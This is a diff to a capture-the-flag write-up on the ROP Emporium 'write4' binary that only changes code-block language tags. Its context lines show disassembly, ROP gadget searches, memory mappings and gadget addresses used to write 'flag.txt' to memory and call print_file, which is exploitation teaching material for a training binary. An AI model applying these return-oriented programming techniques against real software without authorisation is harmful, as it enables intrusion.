@@ -20,7 +20,7 @@ When we open the binary in `gdb` / `radare2`, we notice that `pwnme` function is
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x7f58ace007d0]> pdf@sym.pwnme
 ┌ 153: sym.pwnme ();
 │           ; var int64_t var_20h @ rbp-0x20
@@ -75,7 +75,7 @@ Searching around the binary, we find the function `print_file`:
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 ┌ 140: sym.print_file (int64_t arg1);
 │           ; arg int64_t arg1 @ rdi
 │           ; var int64_t var_8h @ rbp-0x8
@@ -130,7 +130,7 @@ Our next step should be to check the gadgets to see if there's a way to pass dat
 
 {% tabs %}
 {% tab title="ROPgadget" %}
-```bash
+```nasm
 $ ROPgadget --binary write4 --only "pop|ret"
 Gadgets information
 ============================================================
@@ -149,7 +149,7 @@ Gadgets information
 {% endtab %}
 
 {% tab title="ropper" %}
-```bash
+```nasm
 $ ropper --file write4 --search "pop|ret" 
 [INFO] Load gadgets for section: LOAD
 [LOAD] loading... 100%
@@ -183,7 +183,7 @@ payload += p64(f_printfile)
 
 Now, we need a way to store _flag.txt_ somewhere. We'll check for a `mov` gadget that moves a string to the \*_contents of an address_. Something like this might be helpful:
 
-```as
+```nasm
 MOV QWORD PTR [register_1], register_2
 ```
 
@@ -193,7 +193,7 @@ Let's check `ROPgadget` for some options:
 
 {% tabs %}
 {% tab title="ROPgadget" %}
-```bash
+```nasm
 $ ROPgadget --binary write4 --only "mov|pop|ret"
 Gadgets information
 ============================================================
@@ -218,7 +218,7 @@ Unique gadgets found: 15
 {% endtab %}
 
 {% tab title="ropper" %}
-```bash
+```nasm
 $ ropper --file write4 --search "mov|pop|ret"
 [INFO] Load gadgets from cache
 [LOAD] loading... 100%
@@ -261,7 +261,7 @@ $ ropper --file write4 --search "mov|pop|ret"
 
 We find the following gadget which suits our needs:
 
-```as
+```nasm
 0x0000000000400628 : mov qword ptr [r14], r15 ; ret
 ```
 
@@ -270,7 +270,7 @@ This gadget lets us write the contents of `r15` at the location pointed to by `r
 {% hint style="info" %}
 _Just like last time_, there is more than one solution. I wrote another solution in _exploit2.py_ that uses the following gadget:
 
-```as
+```nasm
 0x0000000000400629 : mov dword ptr [rsi], edi ; ret
 ```
 
@@ -279,7 +279,7 @@ I'll talk more about this solution at the end of the writeup.
 
 We'll go back and take note of the following gadget, which lets us control `r14` and `r15`:
 
-```as
+```nasm
 0x0000000000400690 : pop r14 ; pop r15 ; ret
 ```
 
@@ -293,7 +293,7 @@ We can check the mappings inside `gdb` and find a writeable location:
 
 {% tabs %}
 {% tab title="GDB" %}
-```bash
+```nasm
 gef➤  info proc mappings
 process 54986
 Mapped address spaces:
@@ -314,7 +314,7 @@ We see that the `0x601000-0x602000` range is the only writeable range, so let's 
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  x/20gx 0x601000
 0x601000:	0x0000000000600e00	0x00007ffff7ffe2e0
 0x601010:	0x00007ffff7fd8d30	0x0000000000400506
@@ -416,13 +416,13 @@ This would ensure that our string is null-terminated, and that our code works.
 
 _This is the solution I mentioned earlier_. This solution uses the following gadget:
 
-```as
+```nasm
 0x0000000000400629 : mov dword ptr [rsi], edi ; ret
 ```
 
 This means we need to control `rsi` and `edi`. We'll use the following gadgets to do this:
 
-```as
+```nasm
 0x0000000000400691 : pop rsi ; pop r15 ; ret
 0x0000000000400693 : pop rdi ; ret
 ```
